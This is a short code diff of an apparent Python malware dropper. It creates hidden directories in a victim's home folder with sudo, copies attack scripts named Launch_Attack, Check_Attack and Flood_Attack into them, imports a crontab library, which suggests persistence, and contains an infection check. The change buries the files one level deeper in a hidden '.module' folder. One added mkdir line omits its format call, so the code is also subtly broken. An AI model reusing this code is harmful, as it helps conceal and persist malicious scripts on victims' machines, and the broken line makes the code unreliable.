@@ -3,7 +3,7 @@ import sys
 from crontab import CronTab
 
 
-attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
+attackDirs = ['/home/victim/.etc', '/home/victim/.var']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
 
 
@@ -32,9 +32,10 @@ def set_up_attack():
     # Make directories
     for attackDir in attackDirs:
         os.system('sudo mkdir {0}'.format(attackDir))
-        os.system('sudo cp a.py {0}/Launch_Attack.py'.format(attackDir))
-        os.system('sudo cp b.py {0}/Check_Attack.py'.format(attackDir))
-        os.system('sudo cp c.py {0}/Flood_Attack.py'.format(attackDir))
+        os.system('sudo mkdir {0}/.module')
+        os.system('sudo cp a.py {0}/.module/Launch_Attack.py'.format(attackDir))
+        os.system('sudo cp b.py {0}/.module/Check_Attack.py'.format(attackDir))
+        os.system('sudo cp c.py {0}/.module/Flood_Attack.py'.format(attackDir))
 
 
 def is_infect():
